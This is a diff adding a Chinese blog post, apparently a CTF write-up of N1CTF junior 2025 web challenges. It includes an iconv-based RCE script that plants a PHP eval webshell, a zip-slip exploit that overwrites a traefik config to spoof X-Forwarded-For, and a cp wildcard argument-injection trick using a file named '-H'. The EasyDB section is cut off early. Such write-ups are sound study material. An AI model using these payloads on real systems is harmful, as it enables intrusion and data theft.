@@ -1,0 +1,769 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="当时比赛没有打，一直在忙VNCTF赛后的事，忙完后才有断断续续的时间来做做。感谢baozongwi师傅提供的环境🙏。 Gavatar通读源码，upload.php可以写入任意文件。 123456789101112131415161718192021222324&lt;?phprequire_once &amp;#x27;common.php&amp;#x27;;$user &#x3D; getCurrentUser();">
+<meta property="og:type" content="article">
+<meta property="og:title" content="N1CTF junior 2025 Web wp">
+<meta property="og:url" content="http://example.com/2025/02/12/N1CTF2025/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="当时比赛没有打，一直在忙VNCTF赛后的事，忙完后才有断断续续的时间来做做。感谢baozongwi师傅提供的环境🙏。 Gavatar通读源码，upload.php可以写入任意文件。 123456789101112131415161718192021222324&lt;?phprequire_once &amp;#x27;common.php&amp;#x27;;$user &#x3D; getCurrentUser();">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/N1CTF2025/N1.png">
+<meta property="article:published_time" content="2025-02-12T04:55:05.000Z">
+<meta property="article:modified_time" content="2025-02-13T09:58:27.109Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/N1CTF2025/N1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>N1CTF junior 2025 Web wp - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">N1CTF junior 2025 Web wp</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-02-12 12:55" pubdate>
+          2025年2月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">N1CTF junior 2025 Web wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>当时比赛没有打，一直在忙VNCTF赛后的事，忙完后才有断断续续的时间来做做。感谢baozongwi师傅提供的环境🙏。</p>
+<h1 id="Gavatar"><a href="#Gavatar" class="headerlink" title="Gavatar"></a>Gavatar</h1><p>通读源码，upload.php可以写入任意文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">getCurrentUser</span>();<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br><br><span class="hljs-variable">$avatarDir</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatars&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$avatarDir</span>)) <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$avatarDir</span>, <span class="hljs-number">0755</span>);<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$avatarDir</span>/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$finfo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME_TYPE);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]), [<span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type&#x27;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;avatar&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$avatarPath</span>);<br>&#125; <span class="hljs-keyword">elseif</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;       <span class="hljs-comment">//写入任意文件</span><br>    <span class="hljs-variable">$image</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$image</span> === <span class="hljs-literal">false</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid URL&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$avatarPath</span>, <span class="hljs-variable">$image</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025/image-20250212131041372.png" srcset="/img/loading.gif" lazyload alt="image-20250212131041372"></p>
+<p>然后在avatar.php会读取写入的文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;common.php&#x27;</span>;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) ? <span class="hljs-title function_ invoke__">findUserByUsername</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$defaultAvatar</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/images/default-avatar.png&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span>) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: image/png&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$defaultAvatar</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-variable">$avatarPath</span> = <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&quot;/avatars/<span class="hljs-subst">&#123;$user[&#x27;id&#x27;]&#125;</span>&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$avatarPath</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: image/png&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$defaultAvatar</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-title function_ invoke__">mime_content_type</span>(<span class="hljs-variable">$avatarPath</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$avatarPath</span>);    <span class="hljs-comment">//读取写入的文件</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/N1CTF2025/image-20250212131134585.png" srcset="/img/loading.gif" lazyload alt="image-20250212131134585"></p>
+<p>flag是没有权限读取的，需要rce来执行&#x2F;readflag。</p>
+<p>这里直接打 <code>iconv rce</code></p>
+<p>改改代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        self.url = url<br>        self.session = Session()<br>        self.cookies = &#123;<span class="hljs-string">&quot;PHPSESSID&quot;</span>:<span class="hljs-string">&quot;6b3cf95721ed7283199f0ab7451f7f35&quot;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; Response:<br>        <span class="hljs-string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">return</span> self.session.get(self.url+<span class="hljs-string">&quot;/avatar.php?user=admin&quot;</span>,cookies=self.cookies)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">self, path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;Returns the contents of a remote file.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        path = <span class="hljs-string">f&quot;php://filter/convert.base64-encode/resource=<span class="hljs-subst">&#123;path&#125;</span>&quot;</span><br>        self.session.post(self.url+<span class="hljs-string">&quot;/upload.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: path&#125;,cookies=self.cookies)   <span class="hljs-comment">#写文件</span><br>        response = self.send(path)  <span class="hljs-comment">#读文件</span><br>        data = response.re.search(<span class="hljs-string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">return</span> base64.decode(data)<br>    <br>……………………<br><br>url = <span class="hljs-string">&quot;http://localhost:8000&quot;</span><br>command = <span class="hljs-string">&quot;echo &#x27;&lt;?php eval($_POST[1]);&#x27;&gt;/var/www/html/1.php&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>运行之后访问1.php即可rce。</p>
+<h1 id="traefik"><a href="#traefik" class="headerlink" title="traefik"></a>traefik</h1><p>有个flag路由，但是必须要求本地访问，然后还会检查请求头<code>X-Forwarded-For</code>不允许自己添加127.0.0.1，还有个upload路由：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go">r.POST(<span class="hljs-string">&quot;/public/upload&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>	file, err := c.FormFile(<span class="hljs-string">&quot;file&quot;</span>)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;File upload failed&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	randomFolder := randFileName()<br>	destDir := filepath.Join(uploadDir, randomFolder)<br><br>	<span class="hljs-keyword">if</span> err := os.MkdirAll(destDir, <span class="hljs-number">0755</span>); err != <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to create directory&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	zipFilePath := filepath.Join(uploadDir, randomFolder+<span class="hljs-string">&quot;.zip&quot;</span>)<br>	<span class="hljs-keyword">if</span> err := c.SaveUploadedFile(file, zipFilePath); err != <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to save uploaded file&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	<span class="hljs-keyword">if</span> err := unzipFile(zipFilePath, destDir); err != <span class="hljs-literal">nil</span> &#123;<br>		c.JSON(<span class="hljs-number">500</span>, gin.H&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to unzip file&quot;</span>&#125;)<br>		<span class="hljs-keyword">return</span><br>	&#125;<br><br>	c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br>		<span class="hljs-string">&quot;message&quot;</span>: fmt.Sprintf(<span class="hljs-string">&quot;File uploaded and extracted successfully to %s&quot;</span>, destDir),<br>	&#125;)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里的upload路由可以上传zip，然后自动解压压缩包，我们注意附件里给的config&#x2F;dynamic.yml，这是用于设置 HTTP 服务的负载均衡器和路由规则。我们可以上传一个压缩包里面装着名为<code>../../config/dynamic.yml</code>的文件，然后这里面给flag路由写一个代理，接着上传压缩包，解压后会覆盖原来的dynamic文件，我们就可以拿到flag了。</p>
+<p>给出新的dynamic.yml</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">http:</span><br>  <span class="hljs-attr">services:</span><br>    <span class="hljs-attr">proxy:</span><br>      <span class="hljs-attr">loadBalancer:</span><br>        <span class="hljs-attr">servers:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-attr">url:</span> <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>  <span class="hljs-attr">routers:</span><br>    <span class="hljs-attr">index:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/index`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">upload:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/public/upload`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>    <span class="hljs-attr">flag:</span><br>      <span class="hljs-attr">rule:</span> <span class="hljs-string">Path(`/flag`)</span><br>      <span class="hljs-attr">entrypoints:</span> [<span class="hljs-string">web</span>]<br>      <span class="hljs-attr">service:</span> <span class="hljs-string">proxy</span><br>      <span class="hljs-attr">middlewares:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">add-x-forwarded-for</span><br><br>  <span class="hljs-attr">middlewares:</span><br>    <span class="hljs-attr">add-x-forwarded-for:</span><br>      <span class="hljs-attr">headers:</span><br>        <span class="hljs-attr">customRequestHeaders:</span><br>          <span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>add-x-forwarded-for</code> 是一个中间件，它会在请求中添加一个自定义的请求头：<code>X-Forwarded-For: &quot;127.0.0.1&quot;</code>。exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> zipfile<br><br>url = <span class="hljs-string">&quot;http://ctf.baozongwi.xyz:10002&quot;</span><br>zip_filename = <span class="hljs-string">r&#x27;C:\Users\13664\Desktop\123.zip&#x27;</span><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(zip_filename, <span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">as</span> zipf:<br>    zipf.write(<span class="hljs-string">r&#x27;C:\Users\13664\Desktop\dynamic.yml&#x27;</span>, arcname=<span class="hljs-string">&quot;../../.config/dynamic.yml&quot;</span>)<br>    zipf.close()<br><br>res = requests.post(url+<span class="hljs-string">&quot;/public/upload&quot;</span>, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(zip_filename, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br>res = requests.get(url+<span class="hljs-string">&quot;/flag&quot;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br>os.remove(zip_filename)<br></code></pre></td></tr></table></figure>
+
+<h1 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h1><p>这道题没给环境无法复现，写写自己的理解。</p>
+<p>前面php直接反弹shell，然后&#x2F;flag没有权限读取，但是有一个&#x2F;backup.sh 有suid权限，</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span>:<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>
+
+<p>这段 Bash 脚本的作用是每 15 秒钟将 <code>/var/www/html/primary</code> 目录中的所有文件复制到 <code>/var/www/html/backup/</code> 目录，并设置复制后文件的权限为 <code>755</code>。</p>
+<p>注意这里<code>-P</code> 选项确保符号链接不会被解引用</p>
+<p>我们可以用<code>-H</code>参数来覆盖-P参数：</p>
+<blockquote>
+<p><code>cp -H</code> 会让 <code>cp</code> 命令在遇到符号链接时，按照符号链接指向的目标文件进行复制，而不是直接复制符号链接本身。</p>
+</blockquote>
+<p>我们如果有一个软连接指向&#x2F;flag，用<code>-H</code>参数后，会直接把&#x2F;flag复制过来，然后给755权限，然后我们就可以读取了。那怎么覆盖<code>-P</code>参数呢？</p>
+<p>注意这里的<code>*</code>，我们可以创建一个名为<code>-H</code>的文件，cp命令就会多<code>-H</code>这个参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> primary<br><span class="hljs-built_in">touch</span> -- -H<br><span class="hljs-built_in">ln</span> -s /flag readflag<br><span class="hljs-built_in">cat</span> /var/www/html/backup/readflag<br></code></pre></td></tr></table></figure>
+
+
+
+<p>ps：关于如何创建一个名为-H的文件有两种方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> -- -H        //--的作用是不解析后面的参数<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span>&gt;-H<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="EasyDB"><a href="#EasyDB" class="headerlink" title="EasyDB"></a>EasyDB</h1><p>查看application.yml发现是h2数据库：</p>
+<p><img src="/img/N1CTF2025/image-20250213163244935.png" srcset="/img/loading.gif" lazyload alt="image-20250213163244935"></p>
+<p>在登录页面存在sql注入，</p>
+<p><img src="/img/N1CTF2025/image-20250213163051647.png" srcset="/img/loading.gif" lazyload alt="image-20250213163051647"></p>
+<p>对我们的输入进行了过滤</p>
